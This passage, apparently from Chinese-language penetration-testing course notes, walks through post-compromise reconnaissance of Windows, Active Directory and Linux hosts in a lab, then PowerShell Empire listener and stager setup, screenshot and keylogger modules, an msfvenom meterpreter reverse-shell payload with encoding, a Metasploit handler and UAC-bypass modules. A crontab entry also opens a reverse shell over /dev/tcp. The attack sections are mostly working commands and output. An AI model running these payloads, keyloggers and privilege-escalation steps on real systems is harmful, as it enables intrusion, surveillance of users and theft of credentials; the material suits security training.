                           [04]: KB5031354
                           [05]: KB5031592
Network Card(s):           9 NIC(s) Installed.
                           [01]: Realtek Gaming 2.5GbE Family Controller
                                 Connection Name: 以太网
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.1.1
                                 IP address(es)
                                 [01]: 192.168.1.108
                                 [02]: fe80::5224:85bf:79bc:3215
                           [02]: Intel(R) Wireless-AC 9462
                                 Connection Name: WLAN
                                 Status:          Media disconnected
                           [03]: Bluetooth Device (Personal Area Network)
                                 Connection Name: 蓝牙网络连接
                                 Status:          Media disconnected
                           [04]: VMware Virtual Ethernet Adapter for VMnet1
                                 Connection Name: VMware Network Adapter VMnet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.80.1
                                 [02]: fe80::e6fb:9f20:96a0:4fb9
                           [05]: VMware Virtual Ethernet Adapter for VMnet8
                                 Connection Name: VMware Network Adapter VMnet8
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.231.1
                                 [02]: fe80::2472:66b5:f9a9:f964
                           [06]: VMware Virtual Ethernet Adapter for VMnet3
                                 Connection Name: VMware Network Adapter VMnet3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.17.17.1
                                 [02]: fe80::4b25:c8de:7eb1:dd7d
                           [07]: VMware Virtual Ethernet Adapter for VMnet4
                                 Connection Name: VMware Network Adapter VMnet4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.100.1
                                 [02]: fe80::bca:d445:efb0:ec6f
                           [08]: VMware Virtual Ethernet Adapter for VMnet9
                                 Connection Name: VMware Network Adapter VMnet9
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.10.254
                                 [02]: fe80::fb05:f04f:200e:6179
                           [09]: VirtualBox Host-Only Ethernet Adapter
                                 Connection Name: 以太网 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.56.1
                                 [02]: fe80::baf6:b081:efe:c849
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

查看操作系统体系架构

```bash
C:\Users\19374>echo %PROCESSOR_ARCHITECTURE%
AMD64
```

查看系统安装的软件和版本信息

```bash
C:\Users\19374>wmic product get name,version
Name                                                            Version
Python 3.7.2 Documentation (64-bit)                             3.7.2150.0
Python 3.7.2 Utility Scripts (64-bit)                           3.7.2150.0
Python 3.7.2 Add to Path (64-bit)                               3.7.2150.0
```

列出系统中的所有服务和基本信息

```bash
C:\Users\19374>wmic service list brief
ExitCode  Name                                         ProcessId  StartMode  State    Status
1077      AJRouter                                     0          Manual     Stopped  OK
1077      ALG                                          0          Manual     Stopped  OK
```

列出当前系统列出的进程

```bash
C:\Users\19374>tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0      4,416 K
Secure System                  204 Services                   0     47,316 K
```

查看已启动的程序命令

```bash
C:\Users\19374>wmic startup get command, caption
Caption                                                   Command

发送至 OneNote                                            发送至 OneNote.lnk

OneDrive                                                  "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
```

查看计划任务

```bash
C:\Users\lonelyor>schtasks

文件夹: \
任务名                                   下次运行时间           模式
======================================== ====================== ===============
test                                     2023/11/5 16:23:00     正在运行
```

查看用户列表

```bash
C:\Users\19374>net user

User accounts for \\WEIJAY_HOST

-------------------------------------------------------------------------------
19374                    Administrator            DefaultAccount
Guest                    WDAGUtilityAccount
```

查看管理员组的成员

```bash
C:\Users\19374>net localgroup administrators
Alias name     administrators
Comment        管理员对计算机/域有不受限制的完全访问权

Members

-------------------------------------------------------------------------------
19374
Administrator
```

查询当前在线用户的会话信息

```bash
C:\Users\19374>query user || qwinsta
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>19374                 console            18  Active      13:45  2023/11/7 14:06
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           19374                    18  Active
```

列出当前计算机的会话信息

```bash
C:\Windows\System32>net session
There are no entries in the list.
```

查看计算机开放的端口和于哪些计算机建立了连接

```bash
C:\Windows\System32>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1528
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:902            0.0.0.0:0              LISTENING       9752
```

查看当前计算机的补丁的详细信息

```bash
C:\Windows\System32>wmic qfe get caption,description,hotfixid,installedon
Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=5030651  Update           KB5030651  10/11/2023
https://support.microsoft.com/help/5012170  Security Update  KB5012170  5/8/2023
https://support.microsoft.com/help/5026039  Update           KB5026039  5/8/2023
https://support.microsoft.com/help/5031354  Security Update  KB5031354  10/11/2023
                                            Update           KB5031592  10/11/2023
```

查看主机的共享列表

```bash
C:\Windows\System32>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             默认共享
D$           D:\                             默认共享
E$           E:\                             默认共享
IPC$                                         远程 IPC
ADMIN$       C:\Windows                      远程管理


C:\Windows\System32>wmic share get name,path,status
Name    Path        Status
ADMIN$  C:\Windows  OK
C$      C:\         OK
D$      D:\         OK
E$      E:\         OK
IPC$                OK
```

查看路由表

```dos
C:\Windows\System32>route print
===========================================================================
Interface List
  3...0a 00 27 00 00 03 ......VirtualBox Host-Only Ethernet Adapter
 21...38 7a 0e 08 d3 3e ......Microsoft Wi-Fi Direct Virtual Adapter
 10...3a 7a 0e 08 d3 3d ......Microsoft Wi-Fi Direct Virtual Adapter #2
 19...b0 25 aa 4f d7 5d ......Realtek Gaming 2.5GbE Family Controller
```

查看arp表

```bash
C:\Windows\System32>arp -a

Interface: 192.168.56.1 --- 0x3
  Internet Address      Physical Address      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
```

查看防火墙配置

```bash
C:\Windows\System32>netsh firewall show config

域 profile configuration:
-------------------------------------------------------------------
Operational mode                  = 启用
Exception mode                    = 启用
Multicast/broadcast response mode = 启用
Notification mode                 = 启用

Allowed programs configuration for 域 profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------
启用       入站                   WeMeet / E:\腾讯会议\WeMeet\wemeetapp.exe
启用       入站                   SunloginDesktopAgent / E:\向日葵\SunloginClient\agent\SunloginClient.exe
```

防火墙的关闭和启动

```bash
C:\Windows\System32>netsh adcfirewall set allprofiles state off
The following command was not found: adcfirewall set allprofiles state off.

C:\Windows\System32>netsh adcfirewall set allprofiles state up
The following command was not found: adcfirewall set allprofiles state up.
```

查看主机与代理相关的信息

```bash
C:\Windows\System32>reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
    CertificateRevocation    REG_DWORD    0x1
    DisableCachingOfSSLPages    REG_DWORD    0x0
    IE5_UA_Backup_Flag    REG_SZ    5.0
    PrivacyAdvanced    REG_DWORD    0x1
    SecureProtocols    REG_DWORD    0x2800
    User Agent    REG_SZ    Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade    REG_BINARY    2EC8768F8E81D901
    WarnonZoneCrossing    REG_DWORD    0x0
    EnableNegotiate    REG_DWORD    0x1
    ProxyEnable    REG_DWORD    0x0
    MigrateProxy    REG_DWORD    0x1
    LockDatabase    REG_QWORD    0x1d99d38b902d70a
    ProxyServer    REG_SZ    127.0.0.1:7890
    ProxyOverride    REG_SZ    localhost;127.*;10.*;172.16.*;172.17.*;172.18.*;172.19.*;172.20.*;172.21.*;172.22.*;172.23.*;172.24.*;172.25.*;172.26.*;172.27.*;172.28.*;172.29.*;172.30.*;172.31.*;192.168.*;<local>
    ProxyHttp1.1    REG_DWORD    0x1
    EnableHttp1_1    REG_DWORD    0x1
```

查看当前计算机远程连接列表

```bash
C:\Windows\System32>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server\WinStations\RDP-Tcp
    PortNumber    REG_DWORD    0xd3d
```

查看本地用户组

```bash
C:\Users\xiaofei.wen>net localgroup

\\JISHU 的别名

------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Replicator
*Users
```

### 1.2 域成员机信息搜集

查看当前域用户的详细信息

```bash
C:\Users\xiaofei.wen>whoami /all

用户信息
----------------

用户名          SID
=============== =============================================
hwj\xiaofei.wen S-1-5-21-1034659822-2753736081-438606272-1106


组信息
-----------------

组名                                   类型   SID          属性

====================================== ====== ============ =====================
=========
Everyone                               已知组 S-1-1-0      必需的组, 启用于默认,
 启用的组
BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认,
 启用的组
NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认,
 启用的组
```

查看涉及域用户的详细信息

```bash
C:\Users\xiaofei.wen>wmic useraccount get /all
AccountType  Caption              Description                         Disabled
Domain  FullName     InstallDate  LocalAccount  Lockout  Name           Password
Changeable  PasswordExpires  PasswordRequired  SID
              SIDType  Status
512          JISHU\Administrator  管理计算机(域)的内置帐户            TRUE
JISHU                             TRUE          FALSE    Administrator  TRUE
            FALSE            TRUE              S-1-5-21-433939531-3161327439-122
481304-500    1        Degraded
512          JISHU\bob                                                FALSE
JISHU                             TRUE          FALSE    bob            TRUE
```

### 1.3 域控信息搜集

查看域内用户信息

```bash
C:\Users\Administrator>net user /domain

\\WIN-BN3JBDTS87Q 的用户帐户

-------------------------------------------------------------------------------
Administrator            Guest                    jinjun.liang
krbtgt                   xiaofei.wen
```

查看域内组信息

```bash
C:\Users\Administrator>net group /domain

\\WIN-BN3JBDTS87Q 的组帐户

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Protected Users
*Read-only Domain Controllers
*Schema Admins
```

查看域管理员组的信息

```bash
C:\Users\Administrator>net group "Domain Admins" /domain
组名     Domain Admins
注释     指定的域管理员

成员

-------------------------------------------------------------------------------
Administrator
```

查看森林根域的管理员信息

```bash

C:\Users\Administrator>net group "Enter prise Admins" /domain
找不到组名。

请键入 NET HELPMSG 2220 以获得更多的帮助。


C:\Users\Administrator>net group "Enterprise Admins" /domain
组名     Enterprise Admins
注释     企业的指定系统管理员

成员

-------------------------------------------------------------------------------
Administrator
```

查看域控制器的信息

```bash
C:\Users\Administrator>net group "Domain Controllers" /domain
组名     Domain Controllers
注释     域中所有域控制器

成员

-------------------------------------------------------------------------------
WIN-BN3JBDTS87Q$
```

查看域成员机

```bash
C:\Users\Administrator>net group "domain computers" /domain
组名     Domain Computers
注释     加入到域中的所有工作站和服务器

成员

-------------------------------------------------------------------------------
JISHU$
```

查看域内的用户

```bash
C:\Users\Administrator>dsquery user
"CN=Administrator,CN=Users,DC=hwj,DC=com
"CN=Guest,CN=Users,DC=hwj,DC=com"
"CN=krbtgt,CN=Users,DC=hwj,DC=com"
"CN=liangjinjun,CN=Users,DC=hwj,DC=com"
"CN=wenxiaofei,OU=技术部,DC=hwj,DC=com"
```

查看本地管理员组的成员

```bash
C:\Users\Administrator>net localgroup administrators
别名     administrators
注释     管理员对计算机/域有不受限制的完全访问权

成员

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
```

查看域内的密码策略

```bash
C:\Users\Administrator>net accounts /domain
强制用户在时间到期之后多久必须注销?:     从不
密码最短使用期限(天):                    1
密码最长使用期限(天):                    42
密码长度最小值:                          7
保持的密码历史记录长度:                  24
锁定阈值:                                从不
锁定持续时间(分):                        30
锁定观测窗口(分):                        30
计算机角色:                              PRIMARY
```

查看域内的信任信息

```bash
C:\Users\Administrator>nltest /domain_trusts
域信任的列表:
    0: HWJ hwj.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
此命令成功完成
```

## 2. Linux信息搜集

查看主机名

```bash
[root@localhost ~]# hostname
localhost.localdomain
```

查看操作系统的内核版本

```bash
[root@localhost ~]# uname -a
Linux localhost.localdomain 4.18.0-80.el8.x86_64 #1 SMP Wed Mar 13 12:02:46 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

查看CPU信息

```bash
[root@localhost ~]# cat /proc/cpuinfo
processor       : 0
vendor_id       : GenuineIntel
cpu family      : 6
model           : 154
model name      : 12th Gen Intel(R) Core(TM) i7-12700H
stepping        : 3
microcode       : 0xffffffff
cpu MHz         : 2688.001
cache size      : 24576 KB
physical id     : 0
siblings        : 2
core id         : 0
cpu cores       : 2
apicid          : 0
initial apicid  : 0
fpu             : yes
fpu_exception   : yes
cpuid level     : 32
wp              : yes
```

查看磁盘信息

```bash
[root@localhost ~]# df -hl
文件系统               容量  已用  可用 已用% 挂载点
devtmpfs               889M     0  889M    0% /dev
tmpfs                  904M     0  904M    0% /dev/shm
tmpfs                  904M  9.4M  894M    2% /run
tmpfs                  904M     0  904M    0% /sys/fs/cgroup
/dev/mapper/rhel-root   17G  8.3G  8.8G   49% /
/dev/nvme0n1p1        1014M  169M  846M   17% /boot
tmpfs                  181M   16K  181M    1% /run/user/42
tmpfs                  181M  4.0K  181M    1% /run/user/0
```

查看环境变量信息

```bash
[root@localhost ~]# env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=01;05;37;41:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=01;36:*.au=01;36:*.flac=01;36:*.m4a=01;36:*.mid=01;36:*.midi=01;36:*.mka=01;36:*.mp3=01;36:*.mpc=01;36:*.ogg=01;36:*.ra=01;36:*.wav=01;36:*.oga=01;36:*.opus=01;36:*.spx=01;36:*.xspf=01;36:
SSH_CONNECTION=192.168.231.1 57558 192.168.231.147 22
LANG=zh_CN.UTF-8
HISTCONTROL=ignoredups
DISPLAY=localhost:10.0
HOSTNAME=localhost.localdomain
XDG_SESSION_ID=4
USER=root
SELINUX_ROLE_REQUESTED=
PWD=/root
HOME=/root
SSH_CLIENT=192.168.231.1 57558 22
SELINUX_LEVEL_REQUESTED=
XDG_DATA_DIRS=/root/.local/share/flatpak/exports/share:/var/lib/flatpak/exports/share:/usr/local/share:/usr/share
SSH_TTY=/dev/pts/0
MAIL=/var/spool/mail/root
TERM=xterm
SHELL=/bin/bash
SELINUX_USE_CURRENT_RANGE=
SHLVL=1
LOGNAME=root
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus
XDG_RUNTIME_DIR=/run/user/0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/bin/mysql:/root/bin
HISTSIZE=1000
LESSOPEN=||/usr/bin/lesspipe.sh %s
_=/usr/bin/env
```

查看当前的可用shell

````bash
[root@localhost ~]# cat /etc/shells
/bin/sh
/bin/bash
/usr/bin/sh
/usr/bin/bash
````

查看当前登录的用户

```bash
[root@localhost ~]# who
root     pts/0        2023-11-10 03:04 (192.168.231.1)
```

查看当前用户可以以sudo命令执行的操作

```bash
[root@localhost ~]# sudo -l
匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 root 可以在 localhost 上运行以下命令：
    (ALL) ALL
```

查看用户的登录情况

```bash
[root@localhost ~]# last
root     pts/0        192.168.231.1    Fri Nov 10 03:04   still logged in
reboot   system boot  4.18.0-80.el8.x8 Fri Nov 10 03:03   still running
root     pts/1        192.168.231.1    Wed Nov  8 06:03 - crash (1+21:00)
root     tty2         tty2             Wed Nov  8 06:03 - crash (1+21:00)
reboot   system boot  4.18.0-80.el8.x8 Wed Nov  8 06:02   still running
root     pts/2        192.168.231.129  Mon Nov  6 02:19 - 02:46  (00:27)
root     pts/1        192.168.231.1    Mon Nov  6 02:14 - 11:07  (08:52)
root     tty3         tty3             Mon Nov  6 10:12 - down   (00:55)
reboot   system boot  4.18.0-80.el8.x8 Mon Nov  6 08:22 - 11:07  (02:45)
```

查看域名服务器

```bash
[root@localhost ~]# cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver 192.168.231.2
```

查看hosts文件

```bash
[root@localhost ~]# cat /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
```

查看当前服务器的所有服务

```bash
[root@localhost ~]# systemctl list-units --type=service
UNIT                               LOAD   ACTIVE SUB     DESCRIPTION
accounts-daemon.service            loaded active running Accounts Service
alsa-state.service                 loaded active running Manage Sound Card State (restore and store)
atd.service                        loaded active running Job spooling tools
```

查看当前服务器正在运行的服务

```bash
[root@localhost ~]# systemctl list-units --type=service --state=running
UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
accounts-daemon.service  loaded active running Accounts Service
alsa-state.service       loaded active running Manage Sound Card State (restore and store)
atd.service              loaded active running Job spooling tools
```

查询指定服务

```bash
[root@localhost ~]# cat /etc/services |grep ssh
ssh             22/tcp                          # The Secure Shell (SSH) Protocol
ssh             22/udp                          # The Secure Shell (SSH) Protocol
```

查询拥有SUID权限的文件

```bash
[root@localhost ~]# find / -perm -u+s -type f 2>/dev/null
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
```

查看所有进程

```bash
[root@localhost ~]# ps -A
   PID TTY          TIME CMD
     1 ?        00:00:06 systemd
     2 ?        00:00:00 kthreadd
```

查看系统中的软件的版本信息

```bash
[root@localhost ~]# rpm -qa
glusterfs-cli-3.12.2-40.2.el8.x86_64
boost-date-time-1.66.0-6.el8.x86_64
rarian-0.8.1-19.el8.x86_64
gnutls-3.6.5-2.el8.x86_64
```

查看sudo的版本

```bash
[root@localhost ~]# sudo -V
Sudo 版本 1.8.25p1
```

查询防火墙配置

```bash
[root@localhost ~]# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:domain
ACCEPT     udp  --  anywhere             anywhere             udp dpt:bootps
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:bootps
```

查询可写目录

```bash
[root@localhost ~]# find / -perm -o+w -type d 2>/dev/null
/dev/mqueue
/dev/shm
```

查询历史命令

```bash
[root@localhost ~]# history
    1  exit
    2  ifconfig
```

查看系统日志

```bash
[root@localhost ~]# cat /var/log/messages  |head
Nov  6 08:22:12 localhost kernel: Linux version 4.18.0-80.el8.x86_64 (mockbuild@x86-vm-08.build.eng.bos.redhat.com) (gcc version 8.2.1 20180905 (Red Hat 8.2.1-3) (GCC)) #1 SMP Wed Mar 13 12:02:46 UTC 2019
```

查看用户的最近登录信息

```bash
[root@localhost ~]# lastlog
用户名           端口     来自             最后登陆时间
root             pts/0    192.168.231.1    五 11月 10 03:04:56 -0500 2023
bin                                        **从未登录过**
```

查看计划任务

```bash
[root@localhost ~]# crontab -l
*/1 * * * * bash -i >& /dev/tcp/192.168.231.129/4444 0>&1
```

## 3. powershell-empire 基础使用

> Empire4 默认结果保存路径：/var/lib/powershell-empire/server/downloads/
>
> 具体使用可参考：https://blog.csdn.net/qq_45924653/article/details/107115828

### 3.1 设置监听

```bash
# 使用 http模式 作为监听
(Empire) > uselistener http
# 设置监听端口
(Empire: uselistener/http) > set Port 1336
INFO: Set Port to 1336 
# 开始监听
(Empire: uselistener/http) > execute
[+] Listener http successfully started
```

### 3.2 创建木马

```bash
(Empire: uselistener/http) > usestager windows_cmd_exec
(Empire: usestager/windows_cmd_exec) > set Listener http
INFO: Set Listener to http 
(Empire: usestager/windows_cmd_exec) > execute
INFO: launcher.exe written to /var/lib/powershell-empire/empire/client/generated-stagers/launcher.exe 
```

### 3.3 木马上线

客户端在执行了木马程序之后就会自动回弹会话

![image-20231110213142192](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231110213142192.png)

### 3.4 屏幕截图

```bash
(Empire: agents) > usemodule powershell_collection_screenshot

 id           powershell_collection_screenshot                                       
 authors      , @obscuresec,                                                         
              Will Schroeder, @harmj0y, https://twitter.com/harmj0y                  
 description  Takes a screenshot of the current desktop and returns the output as a  
              .PNG.                                                                  
 background   False                                                                  
 language     powershell                                                             
 needs_admin  False                                                                  
 opsec_safe   True                                                                   
 techniques   http://attack.mitre.org/techniques/T1113                               
 comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
              /Get-TimedScreenshot.ps1                                               


┌Record Options────┬──────────┬───────────────────────────────────┐
│ Name  │ Value    │ Required │ Description                       │
├───────┼──────────┼──────────┼───────────────────────────────────┤
│ Agent │ NTHSAFGX │ True     │ Agent to run module on.           │
├───────┼──────────┼──────────┼───────────────────────────────────┤
│ Ratio │          │ False    │ JPEG Compression ratio: 1 to 100. │
└───────┴──────────┴──────────┴───────────────────────────────────┘

(Empire: usemodule/powershell_collection_screenshot) > execute
INFO: Tasked NTHSAFGX to run Task 2 
```

在服务端查看执行结果

![image-20231110214134754](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231110214134754.png)

### 3.5 键盘记录

```bash
(Empire: agents) > usemodule powershell_collection_keylogger

 id           powershell_collection_keylogger                                        
 authors      , @obscuresec,                                                         
              Matt Graeber, @mattifestation, https://twitter.com/mattifestation      
              Will Schroeder, @harmj0y, https://twitter.com/harmj0y                  
 description  Logs keys pressed, time and the active window (when changed) to the    
              keystrokes.txt file. This file is located in the agents downloads      
              directory Empire/downloads/<AgentName>/keystrokes.txt.                 
 background   True                                                                   
 language     powershell                                                             
 needs_admin  False                                                                  
 opsec_safe   True                                                                   
 techniques   http://attack.mitre.org/techniques/T1056                               
 comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
              /Get-Keystrokes.ps1                                                    


┌Record Options─┬──────────┬─────────────────────────────────────┐
│ Name  │ Value │ Required │ Description                         │
├───────┼───────┼──────────┼─────────────────────────────────────┤
│ Agent │       │ True     │ Agent to run module on.             │
├───────┼───────┼──────────┼─────────────────────────────────────┤
│ Sleep │ 0     │ False    │ Sleep time [ms] between key         │
│       │       │          │ presses. Shorter times may increase │
│       │       │          │ CPU usage on the target.            │
└───────┴───────┴──────────┴─────────────────────────────────────┘

(Empire: usemodule/powershell_collection_keylogger) > set Agent NTHSAFGX
INFO: Set Agent to NTHSAFGX 
(Empire: usemodule/powershell_collection_keylogger) > execute
INFO: Tasked NTHSAFGX to run Task 3 
```

服务器结果

![image-20231110214502287](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231110214502287.png)

抓取效果

![image-20231110214514764](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231110214514764.png)

# 第六章：横向移动技术

## 1. Windows UAC提权

### 1.1 什么是UAC提权？

用户访问控制（User Access Control），Windows系统在运行某个需要以管理员权限执行的程序时，都会弹出一个会话窗口询问用户是否执行？

![0286bbdb6bea4ed9aacaa823d074e280.png](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/1612334525_601a45bded5817d55e8bb.jpeg)

UAC提权旨在找出这类应用程序并在不弹出会话窗口的前提下成功以管理员的身份执行这类程序！

### 1.2 UAC提权复现

#### 1.2.1 kali生成木马

```bash
──(root㉿kali)-[/home/kali]
└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.231.153 lport=4444 -e x86/shikata_ga_nai -i 3 -b '\00' -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai chosen with final size 435
Payload size: 435 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

#### 1.2.2 kali 设置监听和靶机上线

```bash
msf6 > use /multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.231.153
LHOST => 192.168.231.153
msf6 exploit(multi/handler) > exploit 
meterpreter > getuid
Server username: LONELYOR\xiaofei
# 将会话转入后台
meterpreter > background 
[*] Backgrounding session 1...
```

#### 1.2.3 运行UAC提权模块

如果提权失败，则尝试换一个模块

```bash
# 搜索可用的UAC提权模块
msf6 exploit(windows/local/bypassuac_sluihijack) > search bypassuac type:exploit

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
   2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   3   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   4   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   5   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
